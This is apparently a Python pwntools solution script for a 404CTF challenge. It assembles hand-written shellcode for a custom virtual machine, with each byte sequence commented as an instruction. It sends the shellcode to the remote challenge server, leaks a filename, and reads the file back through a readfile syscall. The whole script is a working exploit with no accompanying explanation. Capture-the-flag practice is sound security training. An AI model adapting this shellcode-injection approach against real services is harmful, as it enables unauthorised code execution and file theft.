from pwn import *

sc  = b"\x01\x09shellcode\x02"
sc += b":FS"    # mov F,S
sc += b"^BB"    # xor B,B
sc += b">B"     # push B
sc += b"#Cxxxx" # mov C,0x78787878
sc += b"#D=xxx" # mov D,(0x3d+8)^0x78787878
sc += b"^DC"    # xor D,C
sc += b"+SD"    # add SP,D
sc += b"<A"     # pop A
sc += b">A"     # push A
sc += b"-SD"    # sub SP,D
sc += b">A"     # push A
sc += b"#CXxxx" # mov C,0x78787858
sc += b"#D*xxx" # mov D,(0x66+12)^0x78787858
sc += b"^DC"    # xor D,C
sc += b"+SD"    # add SP,D
sc += b"<A"     # pop A
sc += b">A"     # push A
sc += b"-SD"    # sub SP,D
sc += b">A"     # push A
sc += b"#CHxxx" # mov C,0x78787848
sc += b"#D\xc9xxx" # mov D,(0x71+16)^0x78787878
sc += b"^DC"    # xor D,C
sc += b"+SD"    # add SP,D
sc += b"<A"     # pop A
sc += b">A"     # push A
sc += b"-SD"    # sub SP,D
sc += b">A"     # push A
sc += b"<A<B<C" # pop A,B,C
sc += b"^AC^BC" # xor A,C ; xor B,C
sc += b">B>A"   # push B,A
sc += b":AS$"   # mov A,SP ; sys_print
sc += b"#Cxxxx#B]xxx^BC/" # mov B,0x25 ; sys_readfile
sc += b":AS"    # mov A,SP
sc += b"$"      # sys_print
sc += b":SF)"   # leave;ret

cx = remote("challenges.404ctf.fr",31008)

print(cx.readuntil(b': ').decode())
cx.write(sc + b'\n')
rep = cx.read(8)
print('Reading file "' + rep.decode() + '"')
print(cx.read(10000).decode())
cx.close()